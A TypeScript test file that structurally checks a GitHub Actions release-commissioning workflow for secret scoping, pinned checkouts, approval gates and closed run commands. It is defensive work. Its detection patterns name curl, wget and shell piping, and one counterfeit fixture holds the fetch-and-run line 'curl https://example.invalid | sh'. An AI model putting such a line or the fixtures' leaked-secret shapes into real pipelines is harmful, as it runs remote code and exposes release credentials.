import { readFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { parse as parseYaml } from "yaml";

/**
 * AIO-1124 — structural guard over `.github/workflows/release-policy-commissioning.yml`.
 *
 * WHAT THIS GUARDS, AND WHY IT IS PARSED RATHER THAN GREPPED. The commissioning workflow is the one
 * place in this repository where the normal AND emergency release App private keys are both in
 * scope of the same file. Everything that keeps that safe is WIRING — which job may see which
 * secret, which jobs park for a human, what gets checked out, what gets executed, what gets
 * uploaded — and wiring is exactly the class of thing a text search reports on confidently and
 * wrongly. `permissions: { checks: write }` as a flow mapping, `secrets: inherit` on a
 * reusable-workflow call, a second `env:` block further down the same job: each is valid YAML that
 * no anchored regex here would have caught. So this reads the parsed document, and each sweep is
 * proven non-vacuous against a counterfeit fixture below rather than by inspection.
 *
 * SCOPE LIMIT, STATED. This proves the workflow's SHAPE. It cannot prove that
 * `staging-release` / `staging-emergency` actually require a reviewer, that `prevent_self_review` is
 * on, or that the App IDs behind those secrets are distinct — those are provider settings and
 * measured evidence (PC-04, PC-06), not file contents, and nothing green here claims them.
 *
 * PC-05 (the actor matrix itself) is deliberately absent: it lives in the runner's suite, because a
 * workflow file cannot evidence a provider outcome.
 */

const ROOT = join(__dirname, "..", "..");
const FILE = ".github/workflows/release-policy-commissioning.yml";
const raw = readFileSync(join(ROOT, FILE), "utf8");

type Step = {
  uses?: string;
  with?: Record<string, unknown>;
  run?: string;
  env?: Record<string, string>;
  if?: string;
  name?: string;
};
type Job = {
  name?: string;
  if?: string;
  needs?: string | string[];
  environment?: unknown;
  permissions?: unknown;
  secrets?: unknown;
  env?: Record<string, string>;
  steps?: Step[];
};
type Workflow = {
  on?: Record<string, unknown>;
  permissions?: unknown;
  concurrency?: Record<string, unknown>;
  env?: unknown;
  jobs?: Record<string, Job>;
};

const workflow = parseYaml(raw) as Workflow;
const jobs = workflow.jobs ?? {};
const job = (id: string): Job => {
  const j = jobs[id];
  if (!j) throw new Error(`job ${id} is missing from ${FILE}`);
  return j;
};

const EVIDENCE_DIR = "${{ runner.temp }}/policy-commissioning";
const RUNNER = "node scripts/staging-ops/policy-commissioning.mjs";
const runnerCommand = (phase: string) =>
  `${RUNNER} ${phase} --run-id "$GITHUB_RUN_ID" --attempt "$GITHUB_RUN_ATTEMPT" --evidence-dir "$RUNNER_TEMP/policy-commissioning"`;

/**
 * The fixture's entrypoint, EXACTLY. It is a helper call on a fixed inline module command, not a
 * CLI phase: the phase enum is closed by the spec, and this is the shape that widens neither the
 * enum nor the flag surface. Compared character-for-character so a new argument is a red diff.
 */
const FIXTURE_COMMAND =
  `node --input-type=module -e 'import { runFixtureChecks } from "./scripts/staging-ops/policy-commissioning.mjs"; await runFixtureChecks(process.env);'`;

/** The shared NONSECRET identity set every job's entrypoint receives, with its exact `vars.` source. */
const SHARED_VARS: Record<string, string> = {
  COMMISSIONING_NORMAL_APP_ID: "${{ vars.COMMISSIONING_NORMAL_APP_ID }}",
  COMMISSIONING_EMERGENCY_APP_ID: "${{ vars.COMMISSIONING_EMERGENCY_APP_ID }}",
  COMMISSIONING_PRODUCER_IDS_JSON: "${{ vars.COMMISSIONING_PRODUCER_IDS_JSON }}",
  COMMISSIONING_REPOSITORY_ID: "${{ vars.COMMISSIONING_REPOSITORY_ID }}",
};
const SHARED_VAR_KEYS = Object.keys(SHARED_VARS);

/**
 * Everything that is closed per job: the exact entrypoint, the exact evidence filename, the exact
 * secret allowlist, and the exact set of env keys its entrypoint step declares. A fifth job, an
 * extra secret or one smuggled env key must edit this table first.
 */
const JOBS = {
  intent: {
    command: runnerCommand("intent"),
    evidence: "intent.json",
    secrets: [] as string[],
    // Credential-free: no App secret and no GITHUB_TOKEN, so the first artifact in the chain is the
    // one nothing could have been forged with.
    env: [...SHARED_VAR_KEYS],
  },
  fixture: {
    command: FIXTURE_COMMAND,
    evidence: "fixture.json",
    secrets: [] as string[],
    // No CLI flags to carry the evidence dir, so the helper takes it from the environment.
    env: ["COMMISSIONING_EVIDENCE_DIR", "GITHUB_TOKEN", ...SHARED_VAR_KEYS],
  },
  normal: {
    command: runnerCommand("normal-tests"),
    evidence: "normal-tests.json",
    secrets: ["RELEASE_APP_ID", "RELEASE_APP_INSTALLATION_ID", "RELEASE_APP_PRIVATE_KEY"],
    env: ["GITHUB_TOKEN", "RELEASE_APP_ID", "RELEASE_APP_INSTALLATION_ID", "RELEASE_APP_PRIVATE_KEY", ...SHARED_VAR_KEYS],
  },
  emergency: {
    command: runnerCommand("emergency-tests"),
    evidence: "emergency-tests.json",
    secrets: ["EMERGENCY_APP_ID", "EMERGENCY_APP_INSTALLATION_ID", "EMERGENCY_APP_PRIVATE_KEY"],
    env: ["EMERGENCY_APP_ID", "EMERGENCY_APP_INSTALLATION_ID", "EMERGENCY_APP_PRIVATE_KEY", "GITHUB_TOKEN", ...SHARED_VAR_KEYS],
  },
} as const;
const JOB_IDS = Object.keys(JOBS);

const ADMISSION = [
  "github.event_name == 'workflow_dispatch'",
  "github.repository == 'aiosbrain/aios-team-brain'",
  "github.ref == 'refs/heads/staging'",
];

// ---------------------------------------------------------------------------------------------
// Extracted sweeps. Exported so the non-vacuity block can run each one over a counterfeit document
// instead of asserting that the real file happens to be clean — an ∃-shaped guard over one good
// file proves nothing about the next bad one.
// ---------------------------------------------------------------------------------------------

/** Every `secrets.NAME` reachable from a subtree, in any nesting — `env:`, a step's `with:`, an `if:`. */
export function secretRefs(node: unknown): string[] {
  const found = new Set<string>();
  for (const m of JSON.stringify(node ?? null).matchAll(/secrets\.([A-Za-z_][A-Za-z0-9_]*)/g)) {
    found.add(m[1]);
  }
  return [...found].sort();
}

/** Every environment-variable KEY declared anywhere in a subtree (workflow `env:`, job `env:`, step `env:`). */
export function envKeys(node: unknown): string[] {
  const out: string[] = [];
  const walk = (n: unknown) => {
    if (Array.isArray(n)) return n.forEach(walk);
    if (!n || typeof n !== "object") return;
    for (const [k, v] of Object.entries(n as Record<string, unknown>)) {
      if (k === "env" && v && typeof v === "object" && !Array.isArray(v)) out.push(...Object.keys(v));
      walk(v);
    }
  };
  walk(node);
  return out;
}

/**
 * Checkout steps that do NOT pin the immutable dispatch SHA with credentials dropped.
 *
 * Catches three spellings that all mean "run code somebody could have changed after dispatch": a
 * branch NAME, an expression that is not `github.sha`, and a checkout with no `with:` at all (which
 * also leaves `persist-credentials` at its default `true`, parking a usable token in `.git/config`
 * for the rest of the job).
 */
export function looseCheckouts(doc: Workflow): string[] {
  const out: string[] = [];
  for (const [id, j] of Object.entries(doc.jobs ?? {})) {
    const steps = (j.steps ?? []).filter((s) => typeof s.uses === "string" && s.uses.startsWith("actions/checkout@"));
    if (steps.length === 0) out.push(`${id}: no checkout step`);
    for (const s of steps) {
      const w = s.with ?? {};
      if (w.ref !== "${{ github.sha }}") out.push(`${id}: checkout ref is ${JSON.stringify(w.ref ?? null)}`);
      if (w["persist-credentials"] !== false) out.push(`${id}: checkout keeps credentials`);
    }
  }
  return out;
}

/** Every `run:` in the file, normalised to one line so a folded scalar compares exactly. */
export function runCommands(doc: Workflow): { job: string; run: string }[] {
  return Object.entries(doc.jobs ?? {}).flatMap(([id, j]) =>
    (j.steps ?? [])
      .filter((s) => typeof s.run === "string")
      .map((s) => ({ job: id, run: s.run!.replace(/\s+/g, " ").trim() }))
  );
}

/**
 * The ENTRYPOINT steps — every `run:` step that is not the dependency install. This is what the
 * per-job env allowlist is asserted against, so a second credentialed step smuggled into a job
 * cannot hide behind the one that was reviewed.
 */
export function entrypointSteps(doc: Workflow): { job: string; step: Step }[] {
  return Object.entries(doc.jobs ?? {}).flatMap(([id, j]) =>
    (j.steps ?? [])
      .filter((s) => typeof s.run === "string" && !s.run.trim().startsWith("npm "))
      .map((s) => ({ job: id, step: s }))
  );
}

/** Every `actions/upload-artifact` step, with the job it belongs to. */
export function uploads(doc: Workflow): { job: string; step: Step }[] {
  return Object.entries(doc.jobs ?? {}).flatMap(([id, j]) =>
    (j.steps ?? [])
      .filter((s) => typeof s.uses === "string" && s.uses.startsWith("actions/upload-artifact@"))
      .map((s) => ({ job: id, step: s }))
  );
}

// ---------------------------------------------------------------------------------------------

describe("PC-01: fixed targets — manual admission, no arbitrary inputs, immutable source", () => {
  it("covers EXACTLY the four declared jobs, so a fifth cannot slip past every sweep below", () => {
    // Every assertion in this file iterates JOB_IDS or `workflow.jobs`. An exact-set equality is what
    // keeps those two the same thing: a new job added without a row in JOBS reddens here first.
    expect(Object.keys(jobs).sort()).toEqual([...JOB_IDS].sort());
  });

  it("is dispatch-only and has NO inputs at all", () => {
    expect(Object.keys(workflow.on ?? {})).toEqual(["workflow_dispatch"]);
    // PC-01 forbids a caller supplying a repo, ref, endpoint, script path or resource name. The
    // guarantee is structural: there is nowhere to type one. `workflow_dispatch:` with an empty body
    // parses to null — anything else here is an input surface.
    expect(workflow.on?.workflow_dispatch, "workflow_dispatch must declare no inputs").toBeNull();
    expect(raw, "no job may read a dispatch input").not.toMatch(/\$\{\{[^}]*\binputs\./);
    expect(raw, "no job may read an unvalidated event payload").not.toMatch(/\$\{\{[^}]*github\.event\./);
  });

  it("EVERY job states the full admission condition itself, rather than inheriting it via needs", () => {
    // A `needs:` edge propagates a SKIP but is not admission control. Two of these jobs hold release
    // App keys, so each one pins repository + branch + event on its own line.
    for (const id of JOB_IDS) {
      for (const clause of ADMISSION) {
        expect(job(id).if ?? "", `job ${id} does not pin ${clause}`).toContain(clause);
      }
    }
  });

  it("EVERY job checks out the immutable dispatch SHA with credentials dropped", () => {
    expect(looseCheckouts(workflow)).toEqual([]);
  });

  it("concurrency is isolated per RUN AND ATTEMPT and never cancels a run being evidenced", () => {
    const group = String(workflow.concurrency?.group ?? "");
    expect(group).toContain("github.run_id");
    expect(group).toContain("github.run_attempt");
    expect(workflow.concurrency?.["cancel-in-progress"]).toBe(false);
  });
});

describe("PC-02: separated execution roles — exact secret allowlists and minimal permissions", () => {
  it("declares read-only default permissions at the workflow level", () => {
    expect(workflow.permissions).toEqual({ contents: "read", actions: "read" });
  });

  it("has NO workflow-level env and NO workflow-level or job-level secret plumbing", () => {
    // A workflow-level `env:` puts a value in scope of every job, which is the one thing this file's
    // whole separation depends on not happening. `secrets: inherit` is the reusable-workflow spelling
    // that hands EVERYTHING to a callee with no `secrets.` text on the line at all.
    expect(workflow.env, "a workflow-level env is in scope of every job").toBeUndefined();
    expect(secretRefs(workflow.env)).toEqual([]);
    expect(raw, "no reusable-workflow secret inheritance").not.toMatch(/secrets:\s*inherit/);
    expect(raw, "no indexed secret access, which the name sweep cannot see").not.toMatch(/secrets\s*\[/);
    for (const id of JOB_IDS) {
      expect(job(id).secrets, `job ${id} must not forward secrets to a reusable workflow`).toBeUndefined();
      expect(job(id).env, `job ${id} must scope env to the step that needs it`).toBeUndefined();
    }
  });

  it("gives each job EXACTLY its allowlisted secrets — no counterpart key, no operator credential", () => {
    for (const [id, spec] of Object.entries(JOBS)) {
      expect(secretRefs(job(id)), `job ${id} secret set`).toEqual([...spec.secrets].sort());
    }
    // Spelled out again against the raw text, because the assertion that matters most is a negative
    // one and an over-clever helper is exactly how a negative assertion goes vacuous.
    expect(JSON.stringify(job("normal"))).not.toContain("secrets.EMERGENCY_");
    expect(JSON.stringify(job("emergency"))).not.toContain("secrets.RELEASE_APP_");
    expect(secretRefs(job("intent")), "the first artifact in the chain is credential-free").toEqual([]);
    expect(secretRefs(job("fixture")), "a job that can mint a check holds no App key").toEqual([]);
  });

  it("withholds a GITHUB_TOKEN from the intent job, and gives it to the other three", () => {
    // NOT "only the fixture gets a token". The two protected jobs need one for `actions: read` /
    // `contents: read` metadata (setup readback, commit-graph verification); it is read-only and is
    // never an actor in the matrix — the actor is the installation token minted from their secrets.
    // What must stay credential-free is `intent`, whose artifact everything downstream is checked
    // against.
    const holders = JOB_IDS.filter((id) => envKeys(job(id)).includes("GITHUB_TOKEN")).sort();
    expect(holders).toEqual(["emergency", "fixture", "normal"]);
    for (const id of holders) {
      expect(job(id).steps?.some((s) => s.env?.GITHUB_TOKEN === "${{ github.token }}"), `job ${id} token source`).toBe(true);
    }
    // `github.token` is the same credential under its expression name; it must not reach `intent`
    // under either spelling.
    expect(envKeys(job("intent"))).not.toContain("GITHUB_TOKEN");
    expect(JSON.stringify(job("intent")), "the intent job must not reference github.token").not.toContain("github.token");
  });

  it("grants `checks: write` to the fixture job ONLY, and grants nothing else write anywhere", () => {
    // This is what keeps the protected jobs' workflow tokens read-only: they can read run and commit
    // metadata and nothing more, so holding one alongside a release key adds no write reach.
    expect(job("fixture").permissions).toEqual({ contents: "read", actions: "read", checks: "write" });
    for (const id of JOB_IDS.filter((i) => i !== "fixture")) {
      expect(job(id).permissions, `job ${id} permissions`).toEqual({ contents: "read", actions: "read" });
    }
    expect(raw, "the only write grant is the fixture's checks: write").not.toMatch(/\bwrite-all\b/);
  });

  it("gives every entrypoint EXACTLY the env keys its row allows, and no role discriminator", () => {
    // An exact key set, not a superset check: a smuggled provider token, a second App ID or a revived
    // discriminator all show up as an inequality here rather than as prose nobody re-reads.
    const steps = entrypointSteps(workflow);
    expect(steps.map((s) => s.job).sort(), "exactly one entrypoint step per job").toEqual([...JOB_IDS].sort());
    for (const { job: id, step } of steps) {
      const spec = JOBS[id as keyof typeof JOBS];
      expect(Object.keys(step.env ?? {}).sort(), `job ${id} entrypoint env`).toEqual([...spec.env].sort());
    }
    // `COMMISSIONING_ROLE` was the provisional discriminator that let the fixture ride the `intent`
    // phase. Both are gone: the fixture has its own helper entrypoint, so nothing needs telling apart.
    expect(raw, "the COMMISSIONING_ROLE discriminator is retired").not.toContain("COMMISSIONING_ROLE");
  });

  it("passes the shared NONSECRET identity set to every job, always from `vars.`", () => {
    // PC-04 needs each protected job to refuse an identical normal/emergency App ID, which it cannot
    // do against an identity it was never told. Numeric App/repository/producer IDs are public
    // metadata; routing them as `vars.` values is what keeps the counterpart PRIVATE KEY in the other
    // environment. Passing the same set everywhere keeps the four evidence files mutually checkable.
    for (const { job: id, step } of entrypointSteps(workflow)) {
      for (const [key, source] of Object.entries(SHARED_VARS)) {
        expect(step.env?.[key], `job ${id} must read ${key} from a repository variable`).toBe(source);
      }
    }
    expect(raw, "an App private key is never a repository variable").not.toMatch(/vars\.[A-Za-z_]*PRIVATE_KEY/);
  });
});

describe("PC-03: ordered bootstrap — dependencies and protected environments", () => {
  const needs = (id: string): string[] => {
    const n = job(id).needs;
    return Array.isArray(n) ? [...n].sort() : n ? [n] : [];
  };

  it("runs the credential-free intent FIRST, depending on nothing", () => {
    expect(needs("intent")).toEqual([]);
    expect(job("intent").environment, "the intent job must not park for approval").toBeUndefined();
  });

  it("wires the exact dependency graph the actor matrix requires", () => {
    expect(needs("fixture")).toEqual(["intent"]);
    // `fixture` is a real dependency of `normal`: the accepted case needs every synthetic check
    // already green, and the missing/red/wrong-producer denials need them in a known state first.
    expect(needs("normal")).toEqual(["fixture", "intent"]);
    // `emergency` deliberately does NOT wait on the fixture — its case is "checks ABSENT accepted".
    expect(needs("emergency")).toEqual(["intent"]);
  });

  it("parks both actor jobs in their own protected environment, and nothing else", () => {
    expect(job("normal").environment).toBe("staging-release");
    expect(job("emergency").environment).toBe("staging-emergency");
    const protectedJobs = JOB_IDS.filter((id) => job(id).environment !== undefined);
    expect(protectedJobs.sort()).toEqual(["emergency", "normal"]);
  });

  it("leaves the fixture UNPROTECTED so it can wait for local setup while the actors are parked", () => {
    // If the fixture were environment-gated it would need its own approval, and the checks the
    // protected jobs are approved to exercise could not exist yet at the moment of approval. Its
    // wait is bounded twice: by the helper's own deadline, and by this job timeout as a backstop.
    expect(job("fixture").environment).toBeUndefined();
    expect(secretRefs(job("fixture"))).toEqual([]);
    expect(typeof (jobs.fixture as unknown as { "timeout-minutes"?: number })["timeout-minutes"]).toBe("number");
  });
});

describe("PC-06: approval controls — App secrets and human gates are the same set", () => {
  it("a job holds an App secret IF AND ONLY IF it parks for human approval", () => {
    const withSecrets = JOB_IDS.filter((id) => secretRefs(job(id)).length > 0).sort();
    const withEnvironment = JOB_IDS.filter((id) => job(id).environment !== undefined).sort();
    expect(withSecrets).toEqual(withEnvironment);
    expect(withSecrets).toEqual(["emergency", "normal"]);
  });

  it("nothing in the workflow can approve, bypass or re-dispatch itself", () => {
    // The approval evidence is GitHub's own review history. A workflow that could call the
    // deployment-approval or environment API, or re-trigger itself, would be manufacturing it.
    for (const forbidden of [
      "actions/github-script",
      "workflow_dispatch.*dispatches",
      "pending_deployments",
      "environments/",
      "gh workflow run",
      "gh api",
    ]) {
      expect(raw, `the workflow must not contain ${forbidden}`).not.toMatch(new RegExp(forbidden));
    }
  });
});

describe("PC-07: evidence — one exact sanitized file per job, nothing raw", () => {
  it("uploads exactly one artifact per job, from the exact filename that job writes", () => {
    expect(uploads(workflow).map((u) => u.job).sort()).toEqual([...JOB_IDS].sort());
    for (const { job: id, step } of uploads(workflow)) {
      const spec = JOBS[id as keyof typeof JOBS];
      expect(step.with?.path, `job ${id} artifact path`).toBe(`${EVIDENCE_DIR}/${spec.evidence}`);
    }
    // The fixture takes no `--evidence-dir` flag, so its env value is the only thing tying the file
    // it writes to the file this workflow uploads. They must be the same directory.
    expect(job("fixture").steps?.some((s) => s.env?.COMMISSIONING_EVIDENCE_DIR === EVIDENCE_DIR)).toBe(true);
  });

  it("makes every upload unconditional, durable for 30 days, and red when the file is missing", () => {
    for (const { job: id, step } of uploads(workflow)) {
      // `always()` so a FAILED actor case still produces its evidence — a failure with no artifact is
      // the case PC-07 most needs recorded.
      expect(step.if, `job ${id} upload is conditional`).toBe("always()");
      expect(step.with?.["retention-days"], `job ${id} retention`).toBe(30);
      // A runner that wrote nothing must be a red job, not a silently empty artifact that reads as
      // "no findings" when the packet is assembled.
      expect(step.with?.["if-no-files-found"], `job ${id} missing-file handling`).toBe("error");
    }
  });

  it("names every artifact distinctly by job AND run AND attempt", () => {
    const names = uploads(workflow).map((u) => String(u.step.with?.name ?? ""));
    expect(new Set(names).size, "artifact names collide").toBe(names.length);
    for (const { job: id, step } of uploads(workflow)) {
      const name = String(step.with?.name ?? "");
      // A rerun derives fresh resources (PC-03); an artifact name without the attempt would let the
      // second attempt's packet overwrite the first's and read as one clean run.
      expect(name, `job ${id} artifact name`).toContain("${{ github.run_id }}");
      expect(name, `job ${id} artifact name`).toContain("${{ github.run_attempt }}");
      expect(name).toContain(id);
    }
  });

  it("never uploads the journal, a directory, a glob, or anything it did not name exactly", () => {
    for (const { job: id, step } of uploads(workflow)) {
      const path = String(step.with?.path ?? "");
      // The local mode-0600 journal and raw provider bodies are local-only. A directory or glob path
      // here is how they would leave the runner without anyone deciding to publish them.
      expect(path, `job ${id} uploads a glob`).not.toMatch(/[*?[\]]/);
      expect(path, `job ${id} uploads a directory`).toMatch(/\.json$/);
      expect(path.toLowerCase(), `job ${id} uploads journal material`).not.toContain("journal");
      expect(path).not.toContain("\n");
    }
    expect(raw, "nothing may consume an artifact produced elsewhere").not.toContain("actions/download-artifact");
  });
});

describe("PC-08: the only things this workflow executes are npm ci and the closed entrypoints", () => {
  it("runs EXACTLY the expected command set — one install and one entrypoint per job", () => {
    const expected = JOB_IDS.flatMap((id) => [
      { job: id, run: "npm ci --ignore-scripts" },
      { job: id, run: JOBS[id as keyof typeof JOBS].command },
    ]);
    expect(runCommands(workflow)).toEqual(expected);
  });

  it("uses only the three phases the spec's closed CLI allows, each once, with no extra flags", () => {
    const cli = runCommands(workflow).filter((c) => c.run.startsWith(RUNNER));
    const phases = cli.map((c) => c.run.slice(RUNNER.length + 1).split(" ")[0]);
    expect(phases.sort()).toEqual(["emergency-tests", "intent", "normal-tests"]);
    const flags = cli.flatMap((c) => c.run.match(/--[a-z-]+/g) ?? []);
    expect([...new Set(flags)].sort()).toEqual(["--attempt", "--evidence-dir", "--run-id"]);
    // The fixture is the ONE non-CLI entrypoint, and it is a fixed inline module call rather than a
    // fourth phase. Compared exactly, so neither an added argument nor a widened enum passes quietly.
    const nonCli = runCommands(workflow).filter((c) => !c.run.startsWith(RUNNER) && !c.run.startsWith("npm "));
    expect(nonCli).toEqual([{ job: "fixture", run: FIXTURE_COMMAND }]);
  });

  it("executes no plan, no artifact, no fetched code and no shell indirection", () => {
    for (const { job: id, run } of runCommands(workflow)) {
      for (const pattern of [/curl/, /wget/, /\bnpx\b/, /\beval\b/, /\$\(/, /`/, /\|\s*(ba)?sh\b/, /\bchmod\b/]) {
        expect(run, `job ${id} run step reaches outside the reviewed tree: ${run}`).not.toMatch(pattern);
      }
      // A run step that interpolates an expression is a template the runner never validated.
      expect(run, `job ${id} interpolates into a shell command`).not.toContain("${{");
    }
    // The inline fixture command may only import from the reviewed tree — a relative path into this
    // repository, never a package name, a URL or a data: specifier.
    expect(FIXTURE_COMMAND).toContain(`from "./scripts/staging-ops/policy-commissioning.mjs"`);
    expect(FIXTURE_COMMAND).not.toMatch(/https?:|data:|node_modules/);
    // `--ignore-scripts` is what stops `npm ci` from executing a dependency's lifecycle script in a
    // job that holds a release App private key.
    for (const c of runCommands(workflow).filter((c) => c.run.startsWith("npm "))) {
      expect(c.run, `job ${c.job} npm install runs lifecycle scripts`).toContain("--ignore-scripts");
    }
  });
});

/**
 * NON-VACUITY. Each sweep above is run over a COUNTERFEIT document that has the defect it claims to
 * detect. Without this block every assertion could be satisfied by a helper that returns `[]`
 * unconditionally, and the file would stay green while the workflow rotted underneath it.
 */
describe("the sweeps are non-vacuous: each detects its own defect in a counterfeit workflow", () => {
  const doc = (yaml: string) => parseYaml(yaml) as Workflow;

  it.each([
    ["a secret in a step's `with:`, where no `env:` sweep would look", "jobs:\n  a:\n    steps:\n      - uses: x/y@v1\n        with:\n          token: ${{ secrets.RELEASE_APP_PRIVATE_KEY }}\n"],
    ["a secret at the workflow level, in scope of every job", "env:\n  K: ${{ secrets.EMERGENCY_APP_PRIVATE_KEY }}\njobs:\n  a:\n    steps: []\n"],
    ["a secret hidden in a job `if:` expression", "jobs:\n  a:\n    if: secrets.RELEASE_APP_ID != ''\n    steps: []\n"],
  ])("secretRefs finds: %s", (_label, yaml) => {
    expect(secretRefs(doc(yaml)).length).toBeGreaterThan(0);
  });

  it("secretRefs does NOT flag a `vars.` reference — that distinction is the whole counterpart design", () => {
    expect(secretRefs(doc("jobs:\n  a:\n    env:\n      K: ${{ vars.COMMISSIONING_NORMAL_APP_ID }}\n"))).toEqual([]);
  });

  it.each([
    ["a branch NAME instead of the SHA", "jobs:\n  a:\n    steps:\n      - uses: actions/checkout@v7\n        with:\n          ref: staging\n          persist-credentials: false\n"],
    ["an expression that is not github.sha", "jobs:\n  a:\n    steps:\n      - uses: actions/checkout@v7\n        with:\n          ref: ${{ github.ref }}\n          persist-credentials: false\n"],
    ["a checkout with no `with:` at all, which also keeps the token in .git/config", "jobs:\n  a:\n    steps:\n      - uses: actions/checkout@v7\n"],
    ["persist-credentials left at its default", "jobs:\n  a:\n    steps:\n      - uses: actions/checkout@v7\n        with:\n          ref: ${{ github.sha }}\n"],
    ["a job with no checkout at all", "jobs:\n  a:\n    steps:\n      - run: 'true'\n"],
    ["a flow mapping, which has no line to anchor a regex on", "jobs:\n  a:\n    steps:\n      - {uses: 'actions/checkout@v7', with: {ref: staging}}\n"],
  ])("looseCheckouts finds: %s", (_label, yaml) => {
    expect(looseCheckouts(doc(yaml)).length).toBeGreaterThan(0);
  });

  it("looseCheckouts accepts the pinned shape, so it is not simply always red", () => {
    expect(
      looseCheckouts(doc("jobs:\n  a:\n    steps:\n      - uses: actions/checkout@v7\n        with:\n          ref: ${{ github.sha }}\n          persist-credentials: false\n"))
    ).toEqual([]);
  });

  it("runCommands normalises a FOLDED scalar to the same single line as a plain one", () => {
    // The real file writes every entrypoint as `>-`; a guard that compared raw text would see a
    // different string for an identical command and would be fixed by loosening it.
    const folded = doc(`jobs:\n  a:\n    steps:\n      - run: >-\n          node scripts/staging-ops/policy-commissioning.mjs intent\n          --run-id "$GITHUB_RUN_ID"\n`);
    expect(runCommands(folded)).toEqual([
      { job: "a", run: 'node scripts/staging-ops/policy-commissioning.mjs intent --run-id "$GITHUB_RUN_ID"' },
    ]);
  });

  it("runCommands sees a smuggled extra step, so the exact-set comparison cannot be padded", () => {
    const extra = doc("jobs:\n  a:\n    steps:\n      - run: npm ci --ignore-scripts\n      - run: curl https://example.invalid | sh\n");
    expect(runCommands(extra).map((c) => c.run)).toContain("curl https://example.invalid | sh");
  });

  it("entrypointSteps sees a SECOND credentialed run step, which the per-job env allowlist then rejects", () => {
    const two = doc("jobs:\n  a:\n    steps:\n      - run: npm ci --ignore-scripts\n      - run: node a.mjs\n        env:\n          GITHUB_TOKEN: ${{ github.token }}\n      - run: node b.mjs\n        env:\n          SNEAKY: '1'\n");
    const found = entrypointSteps(two);
    expect(found.map((s) => s.step.run)).toEqual(["node a.mjs", "node b.mjs"]);
    expect(found.flatMap((s) => Object.keys(s.step.env ?? {}))).toContain("SNEAKY");
  });

  it("envKeys finds a GITHUB_TOKEN declared at the JOB level rather than the step", () => {
    expect(envKeys(doc("jobs:\n  a:\n    env:\n      GITHUB_TOKEN: ${{ github.token }}\n    steps: []\n"))).toContain("GITHUB_TOKEN");
  });

  it("uploads finds an upload step regardless of the action's pinned version", () => {
    const u = uploads(doc("jobs:\n  a:\n    steps:\n      - uses: actions/upload-artifact@v9\n        with:\n          path: x/journal.jsonl\n"));
    expect(u).toHaveLength(1);
    expect(String(u[0].step.with?.path)).toContain("journal");
  });
});
